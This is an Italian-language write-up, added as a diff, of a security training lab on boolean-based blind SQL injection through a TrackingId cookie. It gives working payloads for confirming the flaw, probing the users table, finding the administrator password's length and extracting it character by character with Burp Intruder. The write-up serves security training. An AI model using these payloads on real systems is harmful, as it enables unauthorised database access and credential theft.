@@ -1,0 +1,87 @@
+Lab: Blind SQL injection with conditional responses
+
+📝 Descrizione
+
+Il lab presenta una vulnerabilità di blind SQL injection nel valore del cookie TrackingId, usato dal sito per finalità analitiche.
+Sebbene i risultati delle query non vengano mostrati direttamente e non compaiano errori, la pagina rivela un messaggio "Welcome back" quando la query SQL sottostante restituisce almeno una riga.
+Questo comportamento consente di eseguire un attacco boolean-based blind SQLi, sfruttando differenze di risposta per dedurre la presenza di dati, lunghezza della password e valori carattere per carattere.
+
+⚙️ Passaggi eseguiti
+
+1. Individuazione del punto vulnerabile
+Intercettata con Burp Suite la richiesta HTTP con il cookie:
+
+Cookie: TrackingId=xyz; session=...
+
+2. Test base booleani
+Iniettato payload valido:
+
+TrackingId=xyz' AND '1'='1
+➜ La pagina mostra “Welcome back”.
+
+Iniettato payload falso:
+
+TrackingId=xyz' AND '1'='2
+➜ Il messaggio scompare.
+
+✅ Conferma della vulnerabilità blind SQLi.
+
+3. Verifica presenza tabella users e utente administrator
+Test esistenza della tabella users:
+
+TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+➜ "Welcome back" presente → tabella esiste.
+
+Test presenza utente administrator:
+
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+➜ Conferma che l’utente esiste.
+
+4. Determinazione lunghezza password
+Test sequenziali con operatori LENGTH e >:
+
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+➜ “Welcome back” presente
+
+Aumentato progressivamente il valore fino a:
+
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a
+➜ “Welcome back” scompare → Password lunga esattamente 20 caratteri.
+
+5. Estrazione password con Burp Intruder
+
+Usato payload: TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+
+Posizionato marker su 'a': TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
+
+In Intruder:
+-Tipo di payload: Simple list
+-Caratteri testati: a-z, 0-9
+-Grep Match: Welcome back
+
+Ripetuto l’attacco variando l’offset SUBSTRING(password,N,1) da 1 a 20.
+
+🧠 Ragionamento tecnico
+
+In una blind SQL injection boolean-based, l’attaccante non vede i risultati della query, ma può inferire informazioni sfruttando differenze nel comportamento dell'applicazione.
+In questo caso, la presenza del messaggio "Welcome back" è stata sfruttata come segnale booleano (true/false) per:
+
+-Confermare esistenza di dati
+-Calcolare la lunghezza della password
+-Estrarre caratteri uno alla volta usando SUBSTRING()
+
+Questo approccio è lento ma potente, e può essere automatizzato con strumenti come Burp Intruder.
+
+✅ Soluzione finale
+
+Determinata lunghezza della password: 20 caratteri
+
+Estratti i caratteri uno per uno con payload tipo: TrackingId=xyz' AND (SELECT SUBSTRING(password,3,1) FROM users WHERE username='administrator')='c
+Ricostruita la password completa.
+
+Usata per accedere con:
+
+Username: administrator
+
+Password: (valore trovato)
+
